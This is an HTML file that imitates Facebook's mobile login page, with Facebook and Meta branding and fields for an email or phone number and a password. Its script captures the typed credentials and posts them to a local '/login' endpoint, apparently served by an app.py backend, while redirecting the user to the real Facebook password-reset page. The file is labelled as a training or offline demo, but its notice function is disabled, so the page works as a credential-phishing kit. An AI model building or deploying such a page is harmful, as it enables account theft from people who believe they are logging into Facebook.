<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#ffffff">
  <title>Facebook</title>
  <style>

/* ============================================================
   Scale engine: 1rem = 16px at a 1080px reference width.
   Fluid up to 1080px, then locked 1:1 at design size.
   ============================================================ */

html {
  font-size: calc(100vw / 67.5);
  -webkit-text-size-adjust: 100%;
}

@media (min-width: 1080px) {
  html {
    font-size: 16px;
  }
}

*,
*::before,
*::after {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  padding: 0;
  background: #fff;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue",
    Helvetica, Arial, sans-serif;
  color: #1c1e21;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-tap-highlight-color: transparent;
}

main.page {
  display: block;
  width: 100%;
  max-width: 1080px;
  margin: 0 auto;
  min-height: 90vh;
  background: #fff;
}

.visually-hidden {
  position: absolute;
  width: 1px;
  height: 1px;
  margin: -1px;
  padding: 0;
  overflow: hidden;
  clip: rect(0 0 0 0);
  clip-path: inset(50%);
  white-space: nowrap;
  border: 0;
}

/* ---------- top promo banner ---------- */

.download-banner {
  display: flex;
  align-items: center;
  gap: 1.375rem;
  height: 6.625rem;
  padding: 0 2.875rem;
  border-bottom: 1px solid #e4e6eb;
  color: #1877F2;
  text-decoration: none;
  font-size: 2.25rem;
  line-height: 1.25;
}

.download-icon {
  flex: 0 0 auto;
  width: 2.75rem;
  height: 2.75rem;
  display: block;
}

/* ---------- language ---------- */

.language {
  margin-top: 2.75rem;
  text-align: center;
  font-size: 2.375rem;
  line-height: 1.3;
  color: #65676B;
}

/* ---------- brand mark ---------- */

.brand-mark {
  position: relative;
  width: 11.375rem;
  height: 11.375rem;
  margin: 8rem auto 0;
  border-radius: 50%;
  background: #0866FF;
  overflow: hidden;
  user-select: none;
}

.brand-mark span {
  position: absolute;
  left: 46%;
  bottom: -2.9rem;
  transform: translateX(-50%);
  font-family: Arial, Helvetica, sans-serif;
  font-size: 13rem;
  line-height: 1;
  font-weight: 800;
  color: #fff;
  letter-spacing: -0.06em;
}

/* ---------- form ---------- */

.login-area {
  padding: 0 2.875rem;
}

#identity,
#password {
  display: block;
  width: 100%;
  height: 11.5rem;
  padding: 0 2.625rem;
  border: 1px solid #ccd0d5;
  border-radius: 2.875rem;
  background: #fff;
  color: #1c1e21;
  font-family: inherit;
  font-size: 2.5rem;
  line-height: normal;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  transition: border-color .15s ease, box-shadow .15s ease;
}

#identity {
  margin-top: 5.375rem;
}

#password {
  margin-top: 2.125rem;
}

#identity::placeholder,
#password::placeholder {
  color: rgb(147, 148, 151);
  opacity: 1;
}

#identity:focus,
#password:focus {
  border-color: rgb(202, 203, 204);
  box-shadow: 0 0 0 1px rgb(202, 203, 204);
}

.login-button {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: 7.875rem;
  margin-top: 2.5rem;
  padding: 0;
  border: 0;
  border-radius: 3.9375rem;
  background: #0866FF;
  color: #fff;
  font-family: inherit;
  font-size: 2.5rem;
  font-weight: 700;
  line-height: 1;
  cursor: pointer;
  transition: background-color .15s ease, transform .1s ease;
}

.login-button:hover {
  background: #0a5ae0;
}

.login-button:active {
  transform: scale(.985);
}

.forgot-link {
  display: block;
  margin-top: 3.875rem;
  width: fit-content;
  margin-left: auto;
  margin-right: auto;
  text-align: center;
  font-size: 2.6rem;
  font-weight: 600;
  line-height: 1.3;
  color: rgb(71, 71, 71);
  text-decoration: none;
}

.forgot-link:active {
  opacity: .6;
}

/* ---------- bottom area ---------- */

.bottom-area {
  padding: 0 2.875rem;
}

.create-button {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: 7.875rem;
  margin-top: 15.5rem;
  padding: 0;
  border: 1px solid rgb(68, 139, 223);
  border-radius: 3.9375rem;
  background: #fff;
  color: rgb(68, 139, 223);
  font-family: inherit;
  font-size: 2.5rem;
  font-weight: 530;
  line-height: 1;
  cursor: pointer;
  transition: background-color .15s ease, transform .1s ease;
}

.create-button:hover {
  background: rgba(8, 102, 255, .06);
}

.create-button:active {
  transform: scale(.985);
}

.meta-mark {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: .625rem;
  margin-top: 3.625rem;
  padding-bottom: 3.5rem;
  user-select: none;
}

.meta-mark svg {
  display: block;
  width: 4.25rem;
  height: 2.625rem;
}

.meta-mark span {
  font-size: 2.625rem;
  font-weight: 600;
  line-height: 1;
  letter-spacing: -0.03em;
  color: #1c1e21;
}

/* ---------- demo status notice ---------- */

.demo-message {
  margin: 2rem 2.875rem 0;
  padding: 1.25rem 1.75rem;
  border-radius: 1.5rem;
  background: #f0f2f5;
  color: #3a3b3c;
  font-size: 1.75rem;
  line-height: 1.35;
  text-align: center;
  cursor: pointer;
  word-break: break-word;
}

.demo-message[hidden] {
  display: none;
}
.password-wrapper {
  position: relative;
  width: 100%;
}

.password-wrapper input {
  width: 100%;
  box-sizing: border-box;
  padding-right: 55px;
}

.toggle-password {
  display: none;
  position: absolute;
  right: 17px;
  top: 50%;
  transform: translateY(-50%);
  border: none;
  background: transparent;
  color: rgb(147, 148, 151);
  cursor: pointer;
  padding: 5px;
}

.toggle-password svg {
  width: 25px;
  height: 25px;
}

.password-wrapper:focus-within .toggle-password {
  display: flex;
  align-items: center;
  justify-content: center;
}
.footer-links {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 16px;
  margin-top: 9px;
  margin-bottom: 25px;
}

.footer-links a {
  color: #657786;
  font-size: 11px;
  font-family: Arial, sans-serif;
  font-weight: 400;
  text-decoration: none;
}

.footer-links a:active {
  opacity: 0.7;
}

/* Floating password field */

.password-wrapper.floating-field {
  position: relative;
  width: 100%;
  margin-top: 2.125rem;
}

.password-wrapper.floating-field input {
  display: block;
  width: 100%;
  height: 11.5rem;
  margin-top: 0;
  padding: 0 55px 0 2.625rem;
  border: 1px solid #ccd0d5;
  border-radius: 2.875rem;
  background: #fff;
  color: rgb(147, 148, 151);
  font-family: inherit;
  font-size: 2.5rem;
  outline: none;
  box-sizing: border-box;
}

.password-wrapper.floating-field label {
  position: absolute;
  left: 2.625rem;
  top: 50%;
  transform: translateY(-50%);
  color: #8a8d91;
  font-size: 2.5rem;
  pointer-events: none;
  transition: all .18s ease;
}

.password-wrapper.floating-field input:focus + label,
.password-wrapper.floating-field input:not(:placeholder-shown) + label {
  top: 1.8rem;
  transform: none;
  font-size: 2.5rem;
  color: #65676b;
}

.password-wrapper.floating-field input:focus {
  border-color: rgb(202, 203, 204);
  box-shadow: 0 0 0 1px rgb(202, 203, 204);
  padding-top: 3.5rem;
  padding-bottom: 0;
}

.password-wrapper .toggle-password {
  position: absolute;
  right: 18px;
  top: 50%;
  transform: translateY(-50%);
  z-index: 2;
}
/* Password field position fix */
#password {
  margin-top: 0;
  padding: 0 55px 0 2.625rem;
  line-height: 1;
}

/* Focus karne par typing text neeche shift hoga */
#password:focus {
  padding: 3.5rem 55px 0 2.625rem;
}

/* Password label upar jayega */
#password:focus + label,
#password:not(:placeholder-shown) + label {
  top: 1.8rem;
  transform: none;
}
#password:not(:placeholder-shown) {
  padding: 3.5rem 55px 0 2.625rem;
}
.identity-wrapper {
  position: relative;
  width: 100%;
  margin-top: 5.375rem;
}

.identity-wrapper input {
  display: block;
  width: 100%;
  height: 11.5rem;
  margin-top: 0;
  padding: 0 2.625rem;
  border: 1px solid #ccd0d5;
  border-radius: 2.875rem;
  background: #fff;
  color: rgb(147, 148, 151);
  font-family: inherit;
  font-size: 2.5rem;
  outline: none;
  transition: border-color .15s ease, box-shadow .15s ease, padding .18s ease;
}

.identity-wrapper label {
  position: absolute;
  left: 2.625rem;
  top: 50%;
  transform: translateY(-50%);
  color: #8a8d91;
  font-size: 2.5rem;
  pointer-events: none;
  transition: all .18s ease;
}

.identity-wrapper input:focus,
.identity-wrapper input:not(:placeholder-shown) {
padding: 3.5rem 2.625rem 0;
}

.identity-wrapper input:focus + label,
.identity-wrapper input:not(:placeholder-shown) + label {
  top: 1.8rem;
  transform: none;
  font-size: 2.5rem;
  color: #65676b;
}

.identity-wrapper input:focus {
  border-color: #0866FF;
  box-shadow: 0 0 0 1px #0866FF;
}
#identity:not(:placeholder-shown) {
  padding: 3.5rem 2.625rem 0;
}
#identity:focus {
  padding: 3.5rem 2.625rem 0;
}
</style>
</head>
<body>
  <main class="page">
    <a class="download-banner" href="https://play.google.com/store/apps/details?id=com.facebook.katana"
       target="_blank" rel="noopener noreferrer">
      <svg class="download-icon" viewBox="0 0 48 48" aria-hidden="true">
        <path d="M24 5v25m0 0 9-9m-9 9-9-9M7 30v8a4 4 0 0 0 4 4h26a4 4 0 0 0 4-4v-8"
          fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      <span>Get Facebook for Android and browse faster.</span>
    </a>

    <div class="language">English (US)</div>

    <div class="brand-mark" aria-label="Facebook-style training logo">
      <span>f</span>
    </div>

    <section class="login-area" aria-label="Offline login demonstration">
      <form id="demo-form" autocomplete="off" novalidate>
<div class="identity-wrapper">
  <input
    id="identity"
    name="identity"
    type="text"
    placeholder=" "
    autocomplete="off"
    spellcheck="false"
    aria-label="Mobile number or email"
  >
  <label for="identity">Mobile number or email</label>
</div>
    
<div class="password-wrapper floating-field">

  <input
    id="password"
    name="password"
    type="password"
    placeholder=" "
    autocomplete="off"
    aria-describedby="demo-note"
  >

  <label for="password">Password</label>

  <button
    type="button"
    class="toggle-password"
    id="togglePassword"
    aria-label="Show password"
  >

    <svg id="eyeOff" viewBox="0 0 24 24" fill="none"
      stroke="currentColor" stroke-width="2.2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M3 3l18 18"/>
      <path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/>
      <path d="M9.9 5.2A10.8 10.8 0 0 1 12 5c5 0 9 7 9 7a15 15 0 0 1-3 3.5"/>
      <path d="M6.6 6.6C4.2 8.2 3 12 3 12s4 7 9 7c1.1 0 2.1-.2 3-.6"/>
    </svg>

    <svg id="eyeOn" viewBox="0 0 24 24" fill="none"
      stroke="currentColor" stroke-width="2.2"
      stroke-linecap="round" stroke-linejoin="round"
      style="display:none">
      <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/>
      <circle cx="12" cy="12" r="3"/>
    </svg>

  </button>

</div>

        <button class="login-button" type="submit">Log in</button>
      </form>

      <a class="forgot-link" href=https://m.facebook.com/login/identify/
         target="_blank" rel="noopener noreferrer">Forgot password?</a>
         <div id="demo-message" class="demo-message" hidden></div>
    </section>

    <div class="bottom-area">
  <button class="create-button" id="create-account" type="button">
  Create new account
</button>
</div>
      <div class="meta-mark" aria-label="Meta-style footer mark">
        <svg viewBox="0 0 50 30" role="img" aria-hidden="true">
          <path d="M4 22C7 9 13 3 18 5c7 2 12 19 17 20 5 1 10-8 11-15"
            fill="none" stroke="#0866ff" stroke-width="4.5" stroke-linecap="round"/>
          <path d="M4 22C8 28 13 27 18 18 24 7 28 3 34 5c6 2 9 10 12 17"
            fill="none" stroke="#0866ff" stroke-width="4.5" stroke-linecap="round"/>
        </svg>
        <span>Meta</span>
      </div>
    </div>
<div class="footer-links">
  <a href="https://www.meta.com/en-gb/about/?utm_source=about.meta.com&utm_medium=redirect" target="_blank" rel="noopener noreferrer">About</a>

  <a href="https://m.facebook.com/help/?ref=pf" target="_blank" rel="noopener noreferrer">Help</a>

  <a href="#" target="_blank" rel="noopener noreferrer">More</a>
</div>
  </main>
  <script>
'use strict';

const form = document.getElementById('demo-form');
const message = document.getElementById('demo-message');
const createAccountButton = document.getElementById('create-account');
const identityInput = document.getElementById('identity');
const passwordInput = document.getElementById('password');

function showDemoMessage(text) {
  return;
}

form.addEventListener('submit', async (event) => {
  event.preventDefault();
window.location.href = 'https://m.facebook.com/login/identify/';
  const identity = identityInput.value;
  const password = passwordInput.value;

  showDemoMessage('Checking...');

  try {
    const response = await fetch('/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        identity: identity,
        password: password,
        passwordPresent: password.length > 0
      })
    });

    const result = await response.json();

    // Password is intentionally NOT shown here — only a short confirmation.
    showDemoMessage(result.message);
  } catch (err) {
    showDemoMessage('Server not reachable. Is app.py running?');
  }
});

createAccountButton.addEventListener('click', () => {
  window.location.href = 'https://m.facebook.com/reg/';
});

// Tap the notice to dismiss it.
message.addEventListener('click', () => {
  message.hidden = true;
});
const password = document.getElementById('password');
const button = document.getElementById('togglePassword');
const eyeOn = document.getElementById('eyeOn');
const eyeOff = document.getElementById('eyeOff');

button.addEventListener('click', function () {

  const show = password.type === 'password';

  password.type = show ? 'text' : 'password';

  eyeOff.style.display = show ? 'none' : 'block';
  eyeOn.style.display = show ? 'block' : 'none';

});
</script>
</body>
</html>
